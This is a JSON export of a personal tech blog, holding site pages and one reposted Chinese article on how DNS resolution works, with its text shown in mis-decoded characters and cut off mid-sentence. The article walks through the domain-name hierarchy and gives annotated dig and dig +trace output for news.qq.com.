{"meta":{"title":"Boo","subtitle":"","description":"","author":"Boo","url":"https://www.0x2BeAce.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-05T02:30:21.578Z","updated":"2020-07-05T02:30:21.578Z","comments":true,"path":"404.html","permalink":"https://www.0x2beace.com/404.html","excerpt":"","text":"404 å¾ˆæŠ±æ­‰ï¼Œæ‚¨è®¿é—®çš„é¡µé¢ä¸å­˜åœ¨ å¯èƒ½æ˜¯è¾“å…¥åœ°å€æœ‰è¯¯æˆ–è¯¥åœ°å€å·²è¢«åˆ é™¤"},{"title":"å…³äºæˆ‘","date":"2020-08-15T01:56:27.151Z","updated":"2020-08-15T01:56:27.151Z","comments":true,"path":"about/index.html","permalink":"https://www.0x2beace.com/about/index.html","excerpt":"","text":"å…³äºæ­¤åšå®¢åšå®¢åï¼š0x2BeAce è¯»ä½œ To Be Aceã€‚ Ace æœ‰å¤šä¸ªæ„æ€ï¼Œè¿™é‡Œå– a person who is very skilled at something ã€‚ ä¸“é—¨ç”¨äºæŠ€æœ¯åˆ†äº«ï¼Œè®°å½•ä¸€äº›æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚ è¿™é‡Œå‚è€ƒäº† Soros Liu çš„åšå®¢ã€‚ å…³äºæˆ‘æ¸¸ç¦»äº2.5 æ¬¡å…ƒçš„ä¼ªå…¨æ ˆï¼ŒLinux çˆ±å¥½è€…ã€‚ ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°æˆ‘ï¼š åšå®¢ GitHub Eamil è±†ç“£ - è®°å½•ä¹¦å½± Weibo - å¾ˆä¹…æ²¡æ›´æ–°äº†â€¦ Telegram"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2020-07-05T02:57:23.853Z","updated":"2020-07-05T02:57:23.853Z","comments":true,"path":"categories/index.html","permalink":"https://www.0x2beace.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-05T03:12:46.301Z","updated":"2020-07-05T03:12:46.301Z","comments":true,"path":"mylist/index.html","permalink":"https://www.0x2beace.com/mylist/index.html","excerpt":"","text":""},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2020-07-05T02:29:38.929Z","updated":"2020-07-05T02:29:38.929Z","comments":true,"path":"tags/index.html","permalink":"https://www.0x2beace.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ã€è½¬è½½ã€åŸŸåèƒŒåé‚£äº›äº‹","slug":"those-things-behind-the-domain-name","date":"2021-04-11T07:14:30.000Z","updated":"2021-04-11T07:16:33.330Z","comments":true,"path":"those-things-behind-the-domain-name/","link":"","permalink":"https://www.0x2beace.com/those-things-behind-the-domain-name/","excerpt":"äº’è”ç½‘ä¸­çš„åœ°å€æ˜¯æ•°å­—çš„ IP åœ°å€ï¼Œä¾‹å¦‚61.135.169.125å°±æ˜¯ç™¾åº¦çš„å®˜ç½‘åœ°å€ä¹‹ä¸€ï¼Œå¦‚æœæ¯æ¬¡è®¿é—®ç™¾åº¦éƒ½éœ€è¦è¾“å…¥ IP çš„è¯ï¼Œä¼°è®¡åˆ°ä»Šå¤©äº’è”ç½‘éƒ½è¿˜æ²¡æœ‰èµ°å‡ºé¸¿è’™é˜¶æ®µã€‚","text":"äº’è”ç½‘ä¸­çš„åœ°å€æ˜¯æ•°å­—çš„ IP åœ°å€ï¼Œä¾‹å¦‚61.135.169.125å°±æ˜¯ç™¾åº¦çš„å®˜ç½‘åœ°å€ä¹‹ä¸€ï¼Œå¦‚æœæ¯æ¬¡è®¿é—®ç™¾åº¦éƒ½éœ€è¦è¾“å…¥ IP çš„è¯ï¼Œä¼°è®¡åˆ°ä»Šå¤©äº’è”ç½‘éƒ½è¿˜æ²¡æœ‰èµ°å‡ºé¸¿è’™é˜¶æ®µã€‚ åœ¨ç½‘ç»œå‘å±•å†å²ä¸Šï¼Œæœ€å¼€å§‹ç¡®å®å°±æ˜¯ç›´æ¥ä½¿ç”¨ IP åœ°å€æ¥è®¿é—®è¿œç¨‹ä¸»æœºçš„ã€‚æ—©æœŸè”ç½‘çš„æ¯å°è®¡ç®—æœºéƒ½æ˜¯é‡‡ç”¨ä¸»æœºæ–‡ä»¶ï¼ˆå³æˆ‘ä»¬ä¿—ç§°çš„ hosts æ–‡ä»¶ï¼‰æ¥è¿›è¡Œåœ°å€é…ç½®å’Œè§£æçš„ï¼Œåæ¥è”ç½‘æœºå™¨è¶Šæ¥è¶Šå¤šï¼Œä¸»æœºæ–‡ä»¶çš„æ›´æ–°å’ŒåŒæ­¥å°±æˆäº†å¾ˆå¤§çš„é—®é¢˜ã€‚äºæ˜¯ï¼Œ1983 å¹´ä¿ç½—Â·è«å¡æ´¾ä¹”æ–¯å‘æ˜äº†åŸŸåè§£ææœåŠ¡å’ŒåŸŸåç³»ç»Ÿï¼Œåœ¨ 1985 å¹´ 1 æœˆ 1 æ—¥ï¼Œä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªåŸŸå nordu.net æ‰è¢«æ³¨å†ŒæˆåŠŸã€‚ åŸŸåæ¯” IP åœ°å€æ›´å®¹æ˜“è®°å¿†ï¼Œæœ¬è´¨ä¸Šåªæ˜¯ä¸ºæ•°å­—åŒ–çš„äº’è”ç½‘èµ„æºæä¾›äº†æ˜“äºè®°å¿†çš„åˆ«åï¼Œå°±åƒåœ¨åŒ—äº¬æèµ·ã€Œæ•…å®«åšç‰©é™¢ã€å°±éƒ½çŸ¥é“æŒ‡çš„æ˜¯ã€Œä¸œåŸåŒºæ™¯å±±å‰è¡— 4 å·ã€çš„é‚£ä¸ªå¤§é™¢å­ä¸€æ ·ã€‚å¦‚æœæŠŠ IP åœ°å€çœ‹æˆç”µè¯å·ç ï¼Œé‚£åŸŸåç³»ç»Ÿå°±æ˜¯é€šè®¯å½•ã€‚æˆ‘ä»¬åœ¨é€šè®¯å½•é‡Œä¿å­˜äº†æœ‹å‹å’Œå®¶äººçš„ä¿¡æ¯ï¼Œæ¯æ¬¡é€šè¿‡åå­—æ‰¾åˆ°æŸäººæ‰“ç”µè¯çš„æ—¶å€™ï¼Œé€šè®¯å½•å°±ä¼šæŸ¥å‡ºä¸ä¹‹å…³è”çš„ç”µè¯å·ç ï¼Œç„¶åæ‹¨å·è¿‡å»ã€‚æˆ‘ä»¬å¯èƒ½è®°ä¸ä¸‹å¤šå°‘å®Œæ•´çš„ç”µè¯å·ç ï¼Œä½†æ˜¯è”ç³»äººçš„åå­—å´æ˜¯ä¸€å®šè®°å¾—çš„ã€‚ æ—¢ç„¶ã€ŒåŸŸåã€åªæ˜¯ä¸€ä¸ªåˆ«åï¼Œå•å‡­è¿™ä¸€ä¸ªåå­—æˆ‘ä»¬å¹¶ä¸èƒ½è®¿é—®åˆ°æ­£ç¡®çš„åœ°å€ï¼Œåªæœ‰èƒ½å°†åŸŸåè§£ææˆå®é™…çš„ç½‘ç»œåœ°å€ï¼Œç½‘ç»œè®¿é—®æ‰èƒ½æˆåŠŸã€‚è¿™ç§è§£æå·¥ä½œç”±ä¸“é—¨çš„ã€ŒåŸŸåç³»ç»Ÿã€ï¼ˆDomain Name Systemï¼Œç®€ç§° DNSï¼‰å®Œæˆï¼ŒDNS ä¹Ÿæ˜¯äº’è”ç½‘çš„æ ¸å¿ƒåŸºç¡€æœåŠ¡ä¹‹ä¸€ã€‚ åŸŸåè§£ææ˜¯æ€ä¹ˆå®Œæˆçš„DNS è§£æçš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿåœ¨å¼€å§‹è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€çœ‹åŸŸåçš„å±‚æ¬¡ç»“æ„ã€‚ åŸŸåçš„å±‚çº§ç»“æ„åœ¨è®¨è®ºåŸŸåçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç»å¸¸å¬åˆ°æœ‰äººè¯´ã€Œé¡¶çº§åŸŸåã€ã€ã€Œä¸€çº§åŸŸåã€ã€ã€ŒäºŒçº§åŸŸåã€ç­‰æ¦‚å¿µï¼ŒåŸŸåçº§åˆ«ç©¶ç«Ÿæ˜¯æ€ä¹ˆåˆ’åˆ†çš„å‘¢ï¼Ÿ æ ¹åŸŸåã€‚è¿˜æ˜¯ä»¥ç™¾åº¦ä¸ºä¾‹ï¼Œé€šè¿‡ä¸€äº›åŸŸåè§£æå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç™¾åº¦å®˜ç½‘åŸŸåæ˜¾ç¤ºä¸º www.baidu.com.ï¼Œç»†å¿ƒçš„äººä¼šæ³¨æ„åˆ°ï¼Œè¿™é‡Œæœ€åæœ‰ä¸€ä¸ª .ï¼Œè¿™ä¸æ˜¯ bugï¼Œè€Œæ˜¯æ‰€æœ‰åŸŸåçš„å°¾éƒ¨éƒ½æœ‰ä¸€ä¸ªæ ¹åŸŸåã€‚www.baidu.com çœŸæ­£çš„åŸŸåæ˜¯ www.baidu.com.rootï¼Œç®€å†™ä¸ºwww.baidu.com.ï¼Œåˆå› ä¸ºæ ¹åŸŸå .rootå¯¹äºæ‰€æœ‰åŸŸåéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å¹³æ—¶æ˜¯çœç•¥çš„ï¼Œæœ€ç»ˆå°±å˜æˆäº†æˆ‘ä»¬å¸¸è§çš„æ ·å­ã€‚ æ ¹åŸŸåçš„ä¸‹ä¸€çº§å«åšé¡¶çº§åŸŸåï¼ˆtop-level domainï¼Œç¼©å†™ä¸º TLDï¼‰ï¼Œä¹Ÿå«åšä¸€çº§åŸŸåï¼Œå¸¸è§çš„å¦‚ .com/ã€.net/ã€.org/ã€.cn/ ç­‰ç­‰ï¼Œä»–ä»¬å°±æ˜¯é¡¶çº§åŸŸåã€‚ å†ä¸‹ä¸€çº§å«åšäºŒçº§åŸŸåï¼ˆsecond-level domainï¼Œç¼©å†™ä¸º SLDï¼‰ï¼Œæ¯”å¦‚ baidu.comã€‚è¿™æ˜¯æˆ‘ä»¬èƒ½å¤Ÿè´­ä¹°å’Œæ³¨å†Œçš„æœ€é«˜çº§åŸŸåã€‚æ¬¡çº§åŸŸåä¹‹ä¸‹ï¼Œå°±æ˜¯ä¸»æœºåï¼ˆhostï¼‰ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºä¸‰çº§åŸŸåï¼Œæ¯”å¦‚ www.baidu.comï¼Œç”±æ­¤å¾€ä¸‹ï¼ŒåŸºæœ¬ä¸Š N çº§åŸŸåå°±æ˜¯åœ¨ N-1 çº§åŸŸåå‰è¿½åŠ ä¸€çº§ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œå¸¸è§çš„åŸŸåå±‚çº§ç»“æ„å¦‚ä¸‹ï¼š 12ä¸»æœºå.æ¬¡çº§åŸŸå.é¡¶çº§åŸŸå.æ ¹åŸŸåwww.baidu.com.root ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è´­ä¹°ä¸€ä¸ªåŸŸåå°±æ˜¯è´­ä¹°ä¸€ä¸ªäºŒçº§åŸŸåï¼ˆSLDï¼‰çš„ç®¡ç†æƒï¼ˆå¦‚ 0x2beace.comï¼‰ï¼Œæœ‰äº†è¿™ä¸ªç®¡ç†æƒæˆ‘ä»¬å°±å¯ä»¥éšæ„è®¾ç½®ä¸‰çº§ã€å››çº§åŸŸåäº†ã€‚ åŸŸåè§£æçš„è¿‡ç¨‹ä¸åŸŸåçš„åˆ†çº§ç»“æ„å¯¹åº”ï¼ŒDNS ç³»ç»Ÿä¹Ÿæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œä¸åŒçº§åˆ«çš„åŸŸåç”±ä¸åŒçš„åŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œæ•´ä¸ªè¿‡ç¨‹æ˜¯ä¸€ä¸ªã€Œå±‚çº§å¼ã€çš„ã€‚ å±‚çº§å¼åŸŸåè§£æä½“ç³»çš„ç¬¬ä¸€å±‚å°±æ˜¯æ ¹åŸŸåæœåŠ¡å™¨ï¼Œå…¨ä¸–ç•Œ IPv4 æ ¹åŸŸåæœåŠ¡å™¨åªæœ‰ 13 å°ï¼ˆåå­—åˆ†åˆ«ä¸º A è‡³ Mï¼‰ï¼Œ1 ä¸ªä¸ºä¸»æ ¹æœåŠ¡å™¨åœ¨ç¾å›½ï¼Œå…¶ä½™ 12 ä¸ªå‡ä¸ºè¾…æ ¹æœåŠ¡å™¨ï¼Œå®ƒä»¬è´Ÿè´£ç®¡ç†ä¸–ç•Œå„å›½çš„åŸŸåä¿¡æ¯ã€‚åœ¨æ ¹æœåŠ¡å™¨ä¸‹é¢æ˜¯é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œå³ç›¸å…³å›½å®¶åŸŸåç®¡ç†æœºæ„çš„æ•°æ®åº“ï¼Œå¦‚ä¸­å›½äº’è”ç½‘ç»œä¿¡æ¯ä¸­å¿ƒï¼ˆCNNICï¼‰ã€‚ç„¶åæ˜¯å†ä¸‹ä¸€çº§çš„æƒå¨åŸŸåæœåŠ¡å™¨å’Œ ISP çš„ç¼“å­˜æœåŠ¡å™¨ã€‚ ä¸€ä¸ªåŸŸåå¿…é¡»é¦–å…ˆç»è¿‡æ ¹æ•°æ®åº“çš„è§£æåï¼Œæ‰èƒ½è½¬åˆ°é¡¶çº§åŸŸåæœåŠ¡å™¨è¿›è¡Œè§£æï¼Œè¿™ä¸€ç‚¹ä¸ç”Ÿæ´»ä¸­é—®è·¯çš„æƒ…å½¢æœ‰å‡ åˆ†ç›¸ä¼¼ã€‚ å‡è®¾åŒ—äº¬å¸‚è®¾ç«‹äº†ä¸€ä¸ªä¸“é—¨çš„ã€Œé“è·¯å’¨è¯¢å±€ã€ï¼Œé‡Œé¢è®¾ç½®äº†å±€é•¿ã€éƒ¨é•¿ã€å¤„é•¿ã€ç§‘å‘˜å¥½å‡ ä¸ªçº§åˆ«çš„å…¬åŠ¡å‘˜ï¼Œä¸åŒçš„éƒ¨é—¨ã€ç§‘å®¤ã€äººå‘˜è´Ÿè´£è§£ç­”ä¸åŒåŒºåŸŸçš„é“è·¯é—®é¢˜ã€‚è¿™é‡Œçš„äººéƒ½æœ‰ä¸€ä¸ªå…±åŒç‰¹ç‚¹ï¼Œä¿¡å¥‰ã€Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ã€çš„å“²ç†ï¼Œå–œæ¬¢å°†è‡ªå·±äº†è§£åˆ°çš„ä¿¡æ¯è®°å½•åˆ°ç¬”è®°æœ¬ä¸Šã€‚ä½†æ˜¯æœ‰ä¸€ç‚¹é—æ†¾çš„æ˜¯ï¼Œä»–ä»¬å†™å­—ç”¨çš„å¢¨æ°´åªæœ‰ä¸€ç§ï¼Œå«ã€Œé­”æœ¯å¢¨æ°´ã€ï¼Œåˆå†™å­—è¿¹æµ“åšï¼Œä¹‹åä¼šæ…¢æ…¢å˜æ·¡ï¼Œ1 å°æ—¶ä¹‹ååˆ™ä¼šå®Œå…¨æ¶ˆå¤±ã€‚é“è·¯å’¨è¯¢å±€é—¨å£è¿˜æœ‰ä¸€ä¸ªé—¨å«å¤§çˆ·ï¼Œæ‰€æœ‰çš„äººè¦é—®è·¯éƒ½éœ€è¦é€šè¿‡ä»–æ¥ä¼ è¾¾å’Œå›å¤ï¼Œå¸‚æ°‘å¹¶ä¸èƒ½è¿›å…¥åŠå…¬æ¥¼ã€‚ å¦‚æœå¸‚æ°‘ A å…ˆç”Ÿæ¥æ‰¾é—¨å«å¤§çˆ·è¯¢é—®ã€ŒåŒ—æµ·å…¬å›­ã€çš„åœ°å€ï¼Œé—¨å«å¤§çˆ·ä¼šå…ˆçœ‹ä¸€ä¸‹è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œæ‰¾æ‰¾çœ‹ä¹‹å‰æœ‰æ²¡æœ‰äººé—®è¿‡åŒ—æµ·å…¬å›­ï¼Œå¦‚æœæ²¡æœ‰ï¼Œä»–å°±ä¼šæ‹¨æ‰“å†…çº¿å»æ‰¾å±€é•¿æ±‚åŠ©ã€‚å±€é•¿è¯´åŒ—æµ·æ˜¯è¥¿åŸåŒºï¼Œä½ å»é—®è´Ÿè´£è¥¿åŸåŒºé“è·¯ä¿¡æ¯çš„èµµéƒ¨é•¿å§ã€‚é—¨å«å¤§çˆ·åˆå»é—®èµµéƒ¨é•¿ï¼Œèµµéƒ¨é•¿æŸ¥äº†ä¸€ä¸‹ï¼Œè¯´è¿™ä¸ªåœ°å€ä½ å»é—®è´Ÿè´£æ ¸å¿ƒåŒºçš„é’±å¤„é•¿å§ã€‚é—¨å«å¤§çˆ·åˆç»™é’±å¤„é•¿æ‰“è¿‡å»ç”µè¯ï¼Œé’±å¤„é•¿è¯´è¿™ä¸ªåœ°å€æˆ‘ä¹Ÿä¸æŒæ¡å•Šï¼Œä½ å»é—®ä¸€ä¸‹è´Ÿè´£æ™¯å±±ç‰‡åŒºçš„ç§‘å‘˜å°å­™å§ã€‚é—¨å«å¤§çˆ·ä»å°å­™é‚£é‡Œç»ˆäºçŸ¥é“äº†åŒ—æµ·å…¬å›­åœ°å€ï¼Œä»–èµ¶ç´§è®°åˆ°è‡ªå·±çš„å°æœ¬æœ¬ä¸Šï¼Œç„¶åæŠŠç»“æœå‘Šè¯‰äº†å¸‚æ°‘ A å…ˆç”Ÿã€‚æ¥ä¸‹æ¥ä¸€å°æ—¶å†…ï¼Œå¦‚æœè¿˜æœ‰å¸‚æ°‘ B å…ˆç”Ÿå†æ¥é—®åŒ—æµ·å…¬å›­çš„è¯ï¼Œé—¨å«å¤§çˆ·å°±ç›´æ¥ç”¨ç¬”è®°æœ¬ä¸Šè®°è½½çš„ç»“æœå›å¤äº†ã€‚å½“ç„¶ï¼Œå¦‚æœå¸‚æ°‘ C å¥³å£«è¿‡æ¥é—®åˆ«çš„åœ°å€çš„è¯ï¼Œé—¨å«å¤§çˆ·å°±è¦æŠŠå¤„ç† A å…ˆç”Ÿé—®è¯¢çš„æµç¨‹å†èµ°ä¸€éäº†ã€‚ åˆ†çº§æŸ¥è¯¢çš„å®ä¾‹ç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®é™…çš„ä¾‹å­ã€‚å¦‚æœæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥https://news.qq.comï¼Œé‚£æµè§ˆå™¨ä¼šä»æ¥æ”¶åˆ°çš„ URL ä¸­æŠ½å–å‡ºåŸŸåå­—æ®µï¼ˆnews.qq.comï¼‰ï¼Œç„¶åå°†å®ƒä¼ ç»™ DNS å®¢æˆ·ç«¯ï¼ˆæ“ä½œç³»ç»Ÿæä¾›ï¼‰æ¥è§£æã€‚ é¦–å…ˆæˆ‘ä»¬è¯´æ˜ä¸€ä¸‹æœ¬æœº DNS é…ç½®ï¼ˆå°±æ˜¯ /etc/resolv.conf æ–‡ä»¶ï¼Œé‡Œé¢æŒ‡å®šäº†æœ¬åœ° DNS æœåŠ¡å™¨çš„åœ°å€ï¼ŒWindows ç³»ç»Ÿå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼‰ï¼š 123$ cat /etc/resolv.conf nameserver 202.106.0.20nameserver 202.106.196.115 ç„¶åæˆ‘ä»¬ç”¨ dig è¿™ä¸ªå·¥å…·æŸ¥çœ‹ä¸€ä¸‹ news.qq.com çš„è§£æç»“æœï¼ˆå…¶ä¸­ä¸­æ–‡éƒ¨åˆ†æ˜¯è§£é‡Šè¯´æ˜ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ dig news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; news.qq.comè¿™æ˜¯ dig ç¨‹åºçš„ç‰ˆæœ¬å·ä¸è¦æŸ¥è¯¢çš„åŸŸå;; global options: +cmd;; Got answer:ä»¥ä¸‹æ˜¯è¦è·å–çš„å†…å®¹ã€‚;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47559;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0è¿™ä¸ªæ˜¯è¿”å›åº”ç­”çš„å¤´éƒ¨ä¿¡æ¯ï¼š1. opcodeï¼šæ“ä½œç ï¼ŒQUERY ä»£è¡¨æŸ¥è¯¢æ“ä½œï¼›2. status: çŠ¶æ€ï¼ŒNOERROR ä»£è¡¨æ²¡æœ‰é”™è¯¯;3. idï¼šç¼–å·ï¼Œåœ¨ DNS åè®®ä¸­é€šè¿‡ç¼–å·åŒ¹é…è¿”å›å’ŒæŸ¥è¯¢ï¼›4. flags: æ ‡å¿—ï¼Œå«ä¹‰å¦‚ä¸‹: - qrï¼šqueryï¼ŒæŸ¥è¯¢æ ‡å¿—ï¼Œä»£è¡¨æ˜¯æŸ¥è¯¢æ“ä½œ - rdï¼šrecursion desiredï¼Œä»£è¡¨å¸Œæœ›è¿›è¡Œé€’å½’æŸ¥è¯¢æ“ä½œ; - raï¼šrecursive availableï¼Œä»£è¡¨æŸ¥è¯¢çš„æœåŠ¡å™¨æ”¯æŒé€’å½’æŸ¥è¯¢æ“ä½œ;5. QUERY æŸ¥è¯¢æ•°ï¼Œä¸ä¸‹é¢ QUESTION SECTION çš„è®°å½•æ•°ä¸€ä¸€å¯¹åº”ï¼›6. ANSWER ç»“æœæ•°ï¼Œä¸ä¸‹é¢çš„ ANSWER SECTION çš„è®°å½•æ•°ä¸€ä¸€å¯¹åº”ï¼›7. AUTHORITY æƒå¨å›å¤æ•°ï¼Œå¦‚æœæŸ¥è¯¢ç»“æœç”±ç®¡ç†åŸŸåçš„åŸŸåæœåŠ¡å™¨è€Œä¸æ˜¯ç¼“å­˜æœåŠ¡å™¨æä¾›çš„ï¼Œåˆ™ç§°ä¸ºæƒå¨å›å¤ã€‚ 0 è¡¨ç¤ºæ‰€æœ‰ç»“æœéƒ½ä¸æ˜¯æƒå¨å›å¤ï¼›8. ADDITIONAL é¢å¤–è®°å½•æ•°ï¼›;; QUESTION SECTION:;news.qq.com. IN AæŸ¥è¯¢éƒ¨åˆ†,ä»å·¦åˆ°å³éƒ¨åˆ†æ„ä¹‰å¦‚ä¸‹:1ã€è¦æŸ¥è¯¢çš„åŸŸåï¼›2ã€è¦æŸ¥è¯¢ä¿¡æ¯çš„ç±»åˆ«ï¼ŒIN ä»£è¡¨ç±»åˆ«ä¸º IP åè®®ï¼Œå³ Internetã€‚3ã€æŸ¥è¯¢çš„è®°å½•ç±»å‹ï¼ŒA è®°å½•(Address)ä»£è¡¨è¦æŸ¥è¯¢ IPv4 åœ°å€ã€‚;; ANSWER SECTION:news.qq.com. 136 IN CNAME https.qq.com.https.qq.com. 476 IN A 125.39.52.26å›åº”éƒ¨åˆ†ï¼Œä»å·¦åˆ°å³å„éƒ¨åˆ†æ„ä¹‰ï¼š1ã€å¯¹åº”çš„åŸŸå2ã€TTLï¼Œtime to liveï¼Œç¼“å­˜æ—¶é—´ï¼Œå•ä½ç§’ï¼Œä»£è¡¨ç¼“å­˜åŸŸåæœåŠ¡å™¨å¯ä»¥åœ¨ç¼“å­˜ä¸­ä¿å­˜çš„æœŸé™ã€‚3ã€æŸ¥è¯¢ä¿¡æ¯çš„ç±»åˆ«4ã€æŸ¥è¯¢çš„è®°å½•ç±»å‹ï¼ŒCNAME è¡¨ç¤ºåˆ«åè®°å½•ï¼ŒA è®°å½•(Address)ä»£è¡¨ IPv4 åœ°å€ã€‚5ã€åŸŸåå¯¹åº”çš„ ip åœ°å€ã€‚;; Query time: 56 msec;; SERVER: 202.106.0.20#53(202.106.0.20)æŸ¥è¯¢ä½¿ç”¨çš„æœåŠ¡å™¨åœ°å€å’Œç«¯å£,å…¶å®å°±æ˜¯æœ¬åœ° DNS åŸŸåæœåŠ¡å™¨;; WHEN: Thu Jul 11 15:59:37 CST 2019;; MSG SIZE rcvd: 65æŸ¥è¯¢çš„æ—¶é—´ä¸å›åº”çš„å¤§å°ï¼Œæ”¶åˆ° 65 å­—èŠ‚çš„åº”ç­”æ•°æ®ã€‚ ä»è¿™ä¸ªåº”ç­”å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°çš„ç»“æœä¸æ˜¯æƒå¨å›å¤ï¼Œåªæ˜¯æœ¬åœ° DNS æœåŠ¡å™¨ä»ç¼“å­˜ä¸­ç»™äº†åº”ç­”ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ dig å‘½ä»¤ä¸­å¢åŠ ä¸€ä¸ªå‚æ•° +traceï¼Œçœ‹çœ‹å®Œæ•´çš„åˆ†çº§æŸ¥è¯¢è¿‡ç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ dig +trace news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace news.qq.com;; global options: +cmd. 432944 IN NS g.root-servers.net.. 432944 IN NS k.root-servers.net.. 432944 IN NS b.root-servers.net.. 432944 IN NS h.root-servers.net.. 432944 IN NS i.root-servers.net.. 432944 IN NS f.root-servers.net.. 432944 IN NS d.root-servers.net.. 432944 IN NS e.root-servers.net.. 432944 IN NS j.root-servers.net.. 432944 IN NS l.root-servers.net.. 432944 IN NS c.root-servers.net.. 432944 IN NS m.root-servers.net.. 432944 IN NS a.root-servers.net.;; Received 228 bytes from 202.106.0.20#53(202.106.0.20) in 45 msè¿™äº›å°±æ˜¯ç¥ç§˜çš„æ ¹åŸŸåæœåŠ¡å™¨ï¼Œç”±æœ¬åœ° DNS æœåŠ¡å™¨è¿”å›äº†æ‰€æœ‰æ ¹åŸŸåæœåŠ¡å™¨åœ°å€ã€‚com. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.;; Received 1171 bytes from 192.36.148.17#53(i.root-servers.net) in 57 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ .com åŸŸåçš„ 13 æ¡ NS è®°å½•ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨å‘è¿™äº›é¡¶çº§åŸŸåæœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢è¯·æ±‚ï¼Œè¯¢é—® qq.com çš„ NS è®°å½•ã€‚qq.com. 172800 IN NS ns1.qq.com.qq.com. 172800 IN NS ns2.qq.com.qq.com. 172800 IN NS ns3.qq.com.qq.com. 172800 IN NS ns4.qq.com.;; Received 805 bytes from 192.48.79.30#53(j.gtld-servers.net) in 331 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ qq.com çš„ 4 æ¡ NS è®°å½•ï¼Œç”± j.gtld-servers.net è¿™å°æœåŠ¡å™¨æœ€å…ˆè¿”å›ã€‚ç„¶åæœ¬åœ° DNS æœåŠ¡å™¨å‘è¿™å››å°æœåŠ¡å™¨æŸ¥è¯¢ä¸‹ä¸€çº§åŸŸå news.qq.com çš„ NS è®°å½•ã€‚news.qq.com. 86400 IN NS ns-cnc1.qq.com.news.qq.com. 86400 IN NS ns-cnc2.qq.com.;; Received 180 bytes from 58.144.154.100#53(ns4.qq.com) in 37 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ news.qq.com çš„ NS è®°å½•ï¼Œå®ƒä»¬æ˜¯ç”±ä¸Šé¢çš„ ns4.qq.com åŸŸåæœåŠ¡å™¨è¿”å›çš„ã€‚ç„¶åæœ¬åœ° DNS æœåŠ¡å™¨å‘è¿™ä¸¤å°æœºå™¨æŸ¥è¯¢ news.qq.com çš„ä¸»æœºåã€‚news.qq.com. 600 IN CNAME https.qq.com.https.qq.com. 600 IN A 125.39.52.26;; Received 76 bytes from 223.167.83.104#53(ns-cnc2.qq.com) in 29 msè¿™æ˜¯ä¸Šé¢çš„ ns-cnc2.qq.com è¿”å›çš„æœ€ç»ˆæŸ¥è¯¢ç»“æœï¼šnews.qq.com æ˜¯ https.qq.com çš„åˆ«åï¼Œè€Œ https.qq.com çš„ A è®°å½•åœ°å€æ˜¯ 125.39.52.26 å®é™…çš„æµç¨‹é‡Œé¢ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨ç›¸å½“äºé—¨å«å¤§çˆ·ï¼Œæ ¹åŸŸåæœåŠ¡å™¨ç›¸å½“äºå±€é•¿åŒå¿—ï¼Œå…¶ä½™ä»¥æ­¤ç±»æ¨ã€‚å®¢æˆ·ç«¯ä¸æœ¬åœ° DNS æœåŠ¡å™¨ä¹‹é—´çš„æŸ¥è¯¢å«é€’å½’æŸ¥è¯¢ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨ä¸å…¶ä»–åŸŸåæœåŠ¡å™¨ä¹‹é—´çš„æŸ¥è¯¢å°±å«è¿­ä»£æŸ¥è¯¢ã€‚ åŸŸåè®°å½•çš„ç±»å‹åŸŸåæœåŠ¡å™¨ä¹‹æ‰€ä»¥èƒ½çŸ¥é“åŸŸåä¸ IP åœ°å€çš„æ˜ å°„ä¿¡æ¯ï¼Œæ˜¯å› 